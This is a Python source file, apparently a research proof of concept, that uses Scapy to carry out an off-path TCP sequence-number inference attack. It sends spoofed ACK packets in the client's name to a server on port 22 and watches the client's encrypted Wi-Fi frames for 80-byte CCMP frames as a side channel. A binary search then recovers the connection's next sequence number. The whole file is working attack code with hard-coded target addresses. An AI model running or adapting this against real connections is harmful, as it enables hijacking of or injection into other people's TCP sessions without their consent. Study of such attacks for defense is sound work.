#!/usr/bin/python
from scapy.all import *
from copy import deepcopy
import time
from collections import deque

SEQ_NEXT_L = -1
SEQ_NEXT_W = 0
SEQ_NEXT_R = 1

class Candidate:
    def __init__(self, seq_list, time):
        self.seq_list = seq_list
        self.time = time

class Seq_Finder:

    def __init__(self, client_mac='c0:b8:83:0e:ad:85', client_ip='192.168.43.127', 
                 server_ip='124.70.155.59', client_port=65535, server_port=22, send_if_name='wlan0', 
                 sniff_if_name=['wlan1'], seq_window_size=65535, step_size=256, repeat_time=10, repeat_num=4):
        self.client_mac = client_mac
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.client_port = client_port
        self.server_port = server_port

        self.start_seq = 0
        self.end_seq = (1 << 32) - 1
        self.current_seq = self.start_seq

        self.send_if_name = send_if_name #these parameter maybe change
        self.sniff_if_name = sniff_if_name
        self.seq_window_size = seq_window_size
        self.step_size = step_size
        self.repeat_time = repeat_time

        self.sack_ack_num = 0
        self.ack_num = 0
        self.sent_seq = 0
        self.repeat_num = repeat_num

        self.sent_seq_left_bound = -1
        self.seq_next = -1

        self.stop = False
        self.seq_range_end = False
        self.candidate_deque = deque()
        self.keep_nat_time = -1

        self.send_num = 0
        self.send_byte = 0
        self.cost_time = 0
        self.send_rate = 0
        self.result = -1

        self.frame_num = 0
        self.AMSDU_num = 0
        self.valid_frame_num = 0

    def handle_packets(self, packet_list):
        self.sack_ack_num = 0
        self.ack_num = 0

        for pkt in packet_list:
            if pkt[Dot11].addr1==self.client_mac:
                self.frame_num += 1
                if pkt[Dot11].type==2 and pkt[Dot11].subtype==8:
                    ##### This is a qos frame #####
                    if pkt.haslayer("Dot11CCMP"):
                        if pkt.haslayer("Dot11QoS"):
                            if pkt[Dot11QoS].A_MSDU_Present == 1:
                                self.AMSDU_num += 1

                        if len(pkt[Dot11CCMP].data)==80: 
                            self.sack_ack_num += 1
                            self.valid_frame_num += 1
                            break
    
    def check_seq_list(self, seq_list):
        if not seq_list:
            self.target_frame_num = 0
            print('[*] Warning: the seq_list is empty')
            return

        send_list = []
        for sq in seq_list:
            for i in range(self.repeat_num):
                send_list.append(IP(src=self.client_ip, dst=self.server_ip) /
                                TCP(sport=self.client_port, dport=self.server_port, seq=sq, flags='A') / 'ABC')
        
        self.send_num += len(send_list)
        for pkt in send_list:
            self.send_byte += len(pkt)
        
        pkts = sniff(filter="ether host "+self.client_mac, iface=self.sniff_if_name, count=0, 
                      timeout=0.15, started_callback=lambda: send(send_list, iface=self.send_if_name, verbose=False))
        self.handle_packets(pkts)

    def seq_check(self, sq):
        seq_next_left = 0
        check_line = 3

        for i in range(5):
            self.check_seq_list([sq])
            if self.sack_ack_num > 0:  
                seq_next_left += 1
                if seq_next_left >= check_line:
                    return SEQ_NEXT_L
        return SEQ_NEXT_R

    def find_sent_seq(self):
        self.sent_seq = 0 #the inital sent_seq can be random
        location = self.seq_check(self.sent_seq)

        if location == SEQ_NEXT_R:
            self.sent_seq += (1 << 31) #add 2G, change to the sent seq
            if self.sent_seq > (1 << 32):
                self.sent_seq -= (1 << 32)
        
        print('[+] Find a sent seq: %d' %self.sent_seq)
            
    def find_seq_exact(self):
        print("++++++++++ Try to find the SEQ in window ++++++++++")
        self.find_sent_seq()    # find a sent seq

        ##### Binary search based on self.sent_seq #####
        rb = self.sent_seq
        lb = rb - (1 << 31)
        ans = -1

        while rb >= lb:
            mid = int((rb + lb) / 2)
            seq_mid = mid if mid >=0 else mid + (1 << 32)
            check = self.seq_check(seq_mid)

            if check == SEQ_NEXT_L:
                ans = mid
                rb = mid - 1
            else:
                lb = mid + 1

        self.sent_seq_left_bound = ans if ans >= 0 else ans + (1 << 32)
        self.seq_next = (self.sent_seq_left_bound + (1 << 31)) & ((1 << 32) - 1) 
        self.result = self.seq_next

        print('[+] Find the sent seq left bound: %d, the seq next: %d' %(self.sent_seq_left_bound, self.seq_next))

    def run(self):
        time.sleep(0.5) #challenge ack rate limit
        time_start = time.time()

        self.current_seq = self.start_seq
        self.stop = False
        self.seq_range_end = False
        self.send_num = 0
        self.send_byte = 0
        self.result = -1
        self.find_seq_exact()
        
        time_end = time.time()
        self.cost_time = time_end - time_start
        self.send_rate = self.send_byte / self.cost_time

        print('Find the seq in window: %d' %self.result)
        print('Send Packets: %d' %self.send_num)
        print('Send Bytes: %d (Bytes)' %self.send_byte)
        print('Cost Time: %f (s)' %(self.cost_time))
        print("Send Rate: %f (Byte/s)" %(self.send_rate))